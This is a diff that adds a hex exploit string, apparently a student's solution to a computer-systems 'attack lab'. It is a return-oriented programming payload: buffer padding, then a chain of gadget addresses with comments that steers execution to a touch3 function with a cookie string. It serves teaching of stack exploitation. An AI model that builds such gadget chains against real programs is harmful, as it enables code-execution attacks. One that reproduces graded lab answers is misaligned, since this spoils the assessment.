@@ -1,0 +1,38 @@
+00 00 00 00 00 00 00 00 /* Buffer */
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+00 00 00 00 00 00 00 00
+
+/* End buffer */
+/* Note: (v) = good, (x) = bad, (o) = maybe */
+
+93 1b 40 00 00 00 00 00 /* gadget 1: movq %rsp, %rax 401b93, 401b3f */
+
+e3 1a 40 00 00 00 00 00 /* gadget 2: movq %rax, %rdi 401ae3, 401afd */
+
+f2 1a 40 00 00 00 00 00 /* gadget 3: popq %rax from moving rax to register */
+
+48 00 00 00 00 00 00 00 /* gap between gadget 1 and cookie start from 56 */
+
+e8 1b 40 00 00 00 00 00 /* gadget test: movq %eax, %edx */
+
+cd 1b 40 00 00 00 00 00 /* gadget 4: movq %edx, %ecx; or bl, bl 401b30(v) */
+
+5b 1b 40 00 00 00 00 00 /* gadget 5: movq %ecx, %esi 401b5b(v), 401b98(v), 401bba(v), 401bc6(v) */
+
+0f 1b 40 00 00 00 00 00 /* gadget 6: lea (%rdi, %rsi, 1), rax 401b0f */
+
+e3 1a 40 00 00 00 00 00 /* gadget 7: movq %rax, %rdi 401ae3, 401afd */
+
+37 1a 40 00 00 00 00 00 /* return address of touch3 401a37 */
+
+36 34 38 65 38 63 64 30 00 /* cookie */
